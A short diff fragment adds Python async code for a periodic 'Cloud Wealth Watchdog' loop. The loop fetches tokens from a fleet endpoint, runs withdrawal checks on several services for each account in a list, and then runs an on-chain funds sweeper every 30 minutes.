+                        try:
+                            async with session.get(f"{cf_url}/api/fleet/tokens", timeout=aiohttp.ClientTimeout(total=8)) as r:
+                                if r.status == 200:
+                                    tokens = await r.json()
+                                    break
+                        except Exception:
+                            pass
+
+                    for acc in accounts:
+                        await check_and_withdraw_ailab(session, acc, tokens)
+                        await asyncio.sleep(0.6)
+                        await check_and_withdraw_ainovum(session, acc, tokens)
+                        await asyncio.sleep(0.6)
+                        await check_and_withdraw_stones(session, acc, tokens)
+                        await asyncio.sleep(0.6)
+
+                    await execute_cloud_onchain_sweeper(session, execute_sweep=True, notify=False)
+
+        except Exception as e:
+            logger.error(f"[Cloud Wealth Watchdog] Cycle error: {e}")
+
+        await asyncio.sleep(1800)
